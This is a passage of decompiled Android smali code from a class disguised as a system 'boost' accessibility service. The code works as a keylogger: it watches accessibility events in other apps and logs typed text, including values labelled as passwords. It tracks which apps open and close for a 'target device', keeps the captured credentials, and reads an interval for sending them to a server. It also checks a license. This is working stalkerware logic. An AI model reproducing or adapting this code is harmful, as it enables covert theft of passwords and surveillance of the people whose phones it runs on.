    const-string v2, "G_SEND_TO_SERVER_INTERVAL = "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-wide/32 v8, 0x493e0

    invoke-interface {v2, v3, v8, v9}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v10

    invoke-virtual {v0, v10, v11}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "G_SEND_TO_SERVER_INTERVAL = "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v2, v3, v8, v9}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v10

    const-wide/16 v12, 0x3e8

    mul-long v10, v10, v12

    invoke-virtual {v0, v10, v11}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_a

    sget-wide v10, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->c:J

    sub-long v10, v6, v10

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v0, v3, v8, v9}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    const-wide/16 v8, 0x3e8

    mul-long v2, v2, v8

    cmp-long v0, v10, v2

    if-lez v0, :cond_a

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v2, "save_battery"

    invoke-interface {v0, v2, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_8

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v2, "battery"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_8

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->z:Lcom/systemservice/a/h/d;

    :goto_2
    invoke-static {v0, v2, v3}, Lcom/systemservice/common/boostReceiver/b;->a(Landroid/content/Context;Landroid/content/SharedPreferences;Lcom/systemservice/a/h/d;)V

    goto :goto_3

    :cond_7
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v2, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    iget-object v3, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->z:Lcom/systemservice/a/h/d;

    goto :goto_2

    :cond_8
    :goto_3
    sput-wide v6, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->c:J
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :cond_9
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :cond_a
    :goto_4
    return-void
.end method

.method static synthetic b(Lcom/systemservice/common/boostReceiver/UIAccessibilityService;)Lcom/systemservice/a/h/g;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->u:Lcom/systemservice/a/h/g;

    return-object p0
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 16

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    const-string v3, "]"

    const-string v4, "["

    const-string v5, "tSKeyLogger"

    const-string v6, "target_device_id"

    const-string v7, "AUIAccessibilityService"

    const-string v8, ""

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "onAccessibilityEvent:"

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "return because checkLicenseExpired() = null"

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    invoke-static {v2, v0, v10}, Lcom/systemservice/common/boostReceiver/b;->a(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/SharedPreferences;Landroid/content/Context;)V

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v0, v6, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const/4 v10, 0x1

    const/4 v11, 0x0

    if-nez v0, :cond_3

    if-eqz v2, :cond_3

    :try_start_1
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v12, 0x20

    if-ne v0, v12, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    invoke-virtual {v0, v12}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v12, "searchbox"

    invoke-virtual {v0, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v12, "com.lge.ime"

    invoke-virtual {v0, v12}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v12, "com.android.systemui"

    invoke-virtual {v0, v12}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v12, "com.google.android.inputmethod.latin"

    invoke-virtual {v0, v12}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v12, "com.google.android.packageinstaller"

    invoke-virtual {v0, v12}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    const-string v12, "com.samsung.android.app.cocktailbarservice"

    invoke-virtual {v0, v12}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    const-string v0, "TeXTAccebility"

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "\n\n\n\n\n"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v13, "  \u0111ffdffd\n\n\n\n\n"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v0, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v0, v6, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const-string v12, "app_keylogger_active"

    if-nez v0, :cond_1

    :try_start_2
    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v0, v12, v11}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-direct/range {p0 .. p1}, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->a(Landroid/view/accessibility/AccessibilityEvent;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "getAppKeylogger(accessibilityEvent) = "

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "G_KEYLOGGER_ACTIVE = "

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v13, v12, v11}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v12

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v0, v6, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    const-string v12, "app_log_active"

    invoke-interface {v0, v12, v11}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_3

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, " is CLOSE"

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    invoke-static {}, Lcom/systemservice/a/a/l;->l()J

    move-result-wide v12

    sput-wide v12, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->l:J

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    invoke-direct {v1, v0, v12, v11}, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->a(Ljava/lang/String;Ljava/lang/String;I)V

    :cond_2
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v2}, Lcom/systemservice/common/boostReceiver/b;->a(Landroid/content/Context;Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, " is OPEN"

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_3

    invoke-static {}, Lcom/systemservice/a/a/l;->l()J

    move-result-wide v12

    sput-wide v12, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->k:J

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->w:Ljava/lang/String;

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->v:Ljava/lang/String;

    invoke-direct {v1, v0, v12, v10}, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->a(Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    :try_start_3
    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->s:Lorg/apache/log4j/Logger;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v12, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    :cond_3
    :goto_0
    iget-boolean v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->F:Z

    if-eqz v0, :cond_f

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "mCheckKeylogging = "

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v12

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "mCheckKeylogging = true AND EVENT = "

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v12

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    const/16 v5, 0x2000

    const-wide/16 v13, 0x3e8

    const-string v15, "   packageApp = "

    const/4 v11, 0x2

    if-ne v0, v5, :cond_7

    :try_start_4
    iget v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->p:I

    if-ne v0, v10, :cond_4

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v0, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "password1 = "

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_2

    :cond_4
    iget v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->p:I

    if-ne v0, v11, :cond_7

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_7

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->r:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_7

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "password2 = "

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-interface {v11}, Ljava/util/List;->size()I

    move-result v11

    sub-int/2addr v11, v10

    invoke-interface {v5, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->q:Ljava/lang/String;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/util/Date;

    invoke-direct {v0}, Ljava/util/Date;-><init>()V

    iput-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->B:Ljava/util/Date;

    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_6

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->r:Ljava/lang/String;

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v11, v10}, Lcom/systemservice/a/e/g;->c(Ljava/lang/String;)V

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    iget-object v11, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->B:Ljava/util/Date;

    invoke-virtual {v11}, Ljava/util/Date;->getTime()J

    move-result-wide v11

    div-long/2addr v11, v13

    invoke-virtual {v10, v11, v12}, Lcom/systemservice/a/e/g;->a(J)V

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    invoke-virtual {v10, v5}, Lcom/systemservice/a/e/g;->d(Ljava/lang/String;)V

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    const/4 v11, 0x5

    invoke-virtual {v10, v11}, Lcom/systemservice/a/e/g;->a(I)V

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    invoke-virtual {v10, v8}, Lcom/systemservice/a/e/g;->b(Ljava/lang/String;)V

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->C:Landroid/content/SharedPreferences;

    invoke-interface {v10, v6, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v10, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_5

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "add password = "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v7, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->A:Lcom/systemservice/a/h/k;

    iget-object v10, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->E:Lcom/systemservice/a/e/g;

    invoke-virtual {v5, v10}, Lcom/systemservice/a/h/k;->a(Lcom/systemservice/a/e/g;)J

    :cond_5
    const/4 v10, 0x1

    goto :goto_1

    :cond_6
    iget-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->clear()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->o:Ljava/util/List;

    const/4 v5, 0x0

    iput v5, v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->p:I

    :cond_7
    :goto_2
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v5, 0x10

    if-ne v0, v5, :cond_f

